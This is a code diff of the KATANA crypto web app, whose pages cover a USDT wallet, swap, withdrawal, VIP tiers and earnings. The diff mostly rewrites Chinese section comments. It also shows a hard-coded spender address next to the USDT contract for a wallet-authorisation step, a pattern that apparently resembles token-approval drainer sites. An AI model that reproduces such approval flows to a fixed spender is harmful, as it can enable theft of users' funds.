@@ -7,6 +7,9 @@
   <title>KATANA</title>
 
   <style>
+    /* ==================================================
+       【全站共用 CSS】
+       ================================================== */
     :root{
       --yellow:#fff400;
       --text:#f7fbff;
@@ -46,6 +49,9 @@ min-height: 100vh;
 
     
 
+    /* ==================================================
+       【首頁 CSS 開始】
+       ================================================== */
     .brand{
       display:flex;
       align-items:center;
@@ -556,7 +562,14 @@ align-self: center;
     justify-self: center;
     align-self: center;
 }
-/* ===== KATANA 錢包頁 ===== */
+/* ==================================================
+   【首頁 CSS 結束】
+   ================================================== */
+
+/* ==================================================
+   【錢包頁面 CSS 開始】
+   包含：錢包資料、USDT 餘額、閃兌、提領
+   ================================================== */
 
 .wallet-page{ 
     padding: 18px 16px 110px; 
@@ -658,7 +671,7 @@ overflow: hidden;
 transform: translate(-213px, -16px);
 }
 
-/* ===== USDT 餘額區 ===== */
+/* ---------- 錢包頁面：USDT 餘額 ---------- */
 
 .balance-header{
     display: flex;
@@ -789,7 +802,7 @@ transform: translate(-213px, -16px);
     font-size: 11px;
 }
 
-/* ===== 閃兌與提領 ===== */
+/* ---------- 錢包頁面：閃兌 ---------- */
 
 .swap-panel{
     margin-top: 28px;
@@ -1006,7 +1019,7 @@ color: #ffffff;
     font-size: 18px;
     font-weight: 800;
 }
-/* ===== 提領畫面 ===== */
+/* ---------- 錢包頁面：提領 ---------- */
 
 .withdraw-box{ 
     margin-top: 0; 
@@ -1110,7 +1123,13 @@ text-indent: 0;
     font-size: 18px;
     font-weight: 800;
 }
-/* ===== 收益歷史頁 ===== */
+/* ==================================================
+   【錢包頁面 CSS 結束】
+   ================================================== */
+
+/* ==================================================
+   【收益歷史頁面 CSS】
+   ================================================== */
 .history-page{
     width: 100%;
     padding: 22px 18px 120px;
@@ -1679,7 +1698,9 @@ top: 7px;
 .features span b {
     color: #00c96b;
 }
-/* ===== KATANA 客服支援中心 ===== */
+/* ==================================================
+   【客服頁面 CSS】
+   ================================================== */
 #supportPage { 
       width: 100%;
        min-height: 100vh;
@@ -1868,7 +1889,9 @@ top: 7px;
     color: inherit;
     outline: none;
 }
-/* ===== KATANA 合約頁 ===== */
+/* ==================================================
+   【合約頁面 CSS】
+   ================================================== */
 
 .contract-page {
     min-height: 100vh;
@@ -1973,7 +1996,9 @@ top: 7px;
     font-weight: 700;
     color: #aeb8ca;
 }
-/* ===== KATANA 中樞配給頁 ===== */
+/* ==================================================
+   【中樞配給頁面 CSS】
+   ================================================== */
 .allocation-page {
      min-height: 100vh;
       padding: 35px 18px 120px;
@@ -2028,7 +2053,9 @@ top: 7px;
     font-weight: 700;
     z-index: 5;
 }
-/* ===== KATANA VIP1 頁 ===== */
+/* ==================================================
+   【VIP 頁面 CSS】
+   ================================================== */
 
 .vip-page {
     min-height: 100vh;
@@ -2329,7 +2356,9 @@ top: 7px;
     font-size: 15px;
 }
 }
-/* ===== 首次首頁公告彈窗 ===== */
+/* ==================================================
+   【首頁公告彈窗 CSS】
+   ================================================== */
  .home-notice-popup { 
     position: fixed;
      inset: 0; 
@@ -3242,7 +3271,9 @@ color: #ffffff !important;
   </button>
   </nav>
 
-  <!-- ===== KATANA 錢包頁 ===== -->
+  <!-- ==================================================
+       【錢包頁面 HTML 開始】
+       ================================================== -->
 <section id="walletPage" class="wallet-page app-page">
     <div class="wallet-info-card">
 
@@ -3309,7 +3340,7 @@ onclick="this.classList.add('pressed');setTimeout(()=>this.classList.remove('pre
     </div>
 
 </div>
- <!-- ===== 閃兌與提領 ===== -->
+ <!-- ---------- 錢包頁面 HTML：閃兌與提領 ---------- -->
 <div class="swap-panel">
     <div class="swap-panel-header">
     <h2>閃兌與提領</h2>
@@ -3369,7 +3400,7 @@ onclick="this.classList.add('pressed');setTimeout(()=>this.classList.remove('pre
         確認閃兌 →
     </button>
 </div>
-<!-- ===== 提領內容 ===== -->
+<!-- ---------- 錢包頁面 HTML：提領內容 ---------- -->
 <div class="withdraw-box" style="display:none;">
     
     <div class="withdraw-input-card">
@@ -3404,7 +3435,11 @@ onclick="this.classList.add('pressed');setTimeout(()=>this.classList.remove('pre
 </div>
 </section>
 
-<!-- ===== KATANA 合約頁 ===== -->
+<!-- ==================================================
+     【錢包頁面 HTML 結束】
+     ================================================== -->
+
+<!-- ===== 【合約頁面 HTML 開始】 ===== -->
 <section id="contractPage" class="contract-page app-page">
     <div class="contract-header">
         <div class="contract-brand">KATANA</div>
@@ -3421,8 +3456,8 @@ onclick="this.classList.add('pressed');setTimeout(()=>this.classList.remove('pre
         </div>
     </div>
 </section>
-<!-- ===== KATANA 合約頁結束 ===== -->
- <!-- ====== KATANA 中樞配給頁 ====== -->
+<!-- ===== 【合約頁面 HTML 結束】 ===== -->
+<!-- ===== 【中樞配給頁面 HTML 開始】 ===== -->
 <section id="allocationPage" class="allocation-page app-page">
     <div class="allocation-content">
         <div class="allocation-main-card">
@@ -3480,8 +3515,8 @@ onclick="this.classList.add('pressed');setTimeout(()=>this.classList.remove('pre
         </div> <!-- allocation-main-card 結束 -->
     </div>
 </section>
-<!-- ====== KATANA 中樞配給頁結束 ====== -->
- <!-- ====== KATANA VIP1 頁 ====== -->
+<!-- ===== 【中樞配給頁面 HTML 結束】 ===== -->
+<!-- ===== 【VIP 頁面 HTML 開始】 ===== -->
 
 <section id="vipPage" class="vip-page app-page">
 
@@ -3618,9 +3653,8 @@ onclick="this.classList.add('pressed');setTimeout(()=>this.classList.remove('pre
 </div>
 </section>
 
-<!-- ====== KATANA VIP1 頁結束 ====== -->
-<!-- ===== KATANA 錢包頁結束 ===== -->
- <!-- ===== 收益歷史頁 ===== -->
+<!-- ===== 【VIP 頁面 HTML 結束】 ===== -->
+ <!-- ===== 【收益歷史頁面 HTML】 ===== -->
 
 <section id="history" class="history-page app-page">
     <div class="history-tabs">
@@ -3670,7 +3704,7 @@ onclick="this.classList.add('pressed');setTimeout(()=>this.classList.remove('pre
 </section>
 
 <!-- ===== 收益歷史頁結束 ===== -->
- <!-- ===== 客服支援中心 ===== -->
+ <!-- ===== 【客服頁面 HTML】 ===== -->
 
 <section id="supportPage" class="support-page app-page">
 
@@ -3745,7 +3779,7 @@ onclick="this.classList.add('pressed');setTimeout(()=>this.classList.remove('pre
 
 <!-- ===== 客服支援中心結束 ===== -->
   <script>
- // ===== 客服訊息發送 =====
+ // ===== 【客服頁面 JavaScript：訊息與圖片】 =====
   const supportInput = document.getElementById("supportInput");
    const supportSend = document.getElementById("supportSend");
     const supportChatArea = document.querySelector(".support-chat-area");
@@ -3796,7 +3830,7 @@ supportInput.addEventListener("keydown", function(event) {
     } 
 });
 
- // ===== 收益歷史四個按鈕切換 =====
+ // ===== 【收益歷史頁面 JavaScript：頁籤切換】 =====
 const historyTabs = document.querySelectorAll(".history-tab");
 
 historyTabs.forEach(tab => {
@@ -3805,7 +3839,7 @@ historyTabs.forEach(tab => {
         tab.classList.add("active");
     });
 });
-    // ===== 閃兌 / 提領切換 ===== 
+    // ===== 【錢包頁面 JavaScript：閃兌／提領切換】 =====
     const swapTab = document.getElementById("swapTab");
     const withdrawTab = document.getElementById("withdrawTab");
      const swapBox = document.querySelector(".swap-box"); 
@@ -3838,7 +3872,7 @@ withdrawBox.style.display = "block";
   });
 
 
-  // ===== 底部導覽 =====
+  // ===== 【全站 JavaScript：底部導覽與頁面切換】 =====
   const navItems = document.querySelectorAll(".nav-item");
   const quickSwap = document.getElementById("quickSwap");
 
@@ -4008,7 +4042,10 @@ if (supportImg) {
 });
 
 
-  // ===== 連接錢包按鈕：目前先做介面預覽 =====
+  // ==================================================
+  // 【錢包連接與授權 JavaScript 開始】
+  // 注意：此區包含 USDT 授權，本輪只加標記，沒有修改內容
+  // ==================================================
   const KATANA_TEST_SPENDER = "0x066F0818D2a4240741F2ffa44237DcBfD42D1537";
   const ETH_MAINNET_CHAIN_ID = "0x1";
   const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
@@ -4175,7 +4212,11 @@ return
 });
 
 
-  // ===== 公告 =====
+  // ==================================================
+  // 【錢包連接與授權 JavaScript 結束】
+  // ==================================================
+
+  // ===== 【首頁 JavaScript：公告按鈕】 =====
   const announcementBtn =
     document.getElementById("announcementBtn");
 
@@ -4186,7 +4227,7 @@ return
   });
 
 
-  // ===== 語言切換示範 =====
+  // ===== 【首頁 JavaScript：語言切換】 =====
   const langBtn = document.getElementById("langBtn");
 
   let currentLang = "zh";
@@ -4212,7 +4253,7 @@ if (menuBtn) {
     );
   });
 }
-  // ===== VIP 頁面切換 ===== 
+  // ===== 【VIP 頁面 JavaScript：頁面切換與計算】 =====
   const vipEntryBtn = document.querySelector(".allocation-vip-btn");
    const vipPage = document.getElementById("vipPage");
     const vipBackBtn = document.getElementById("vipBackBtn");
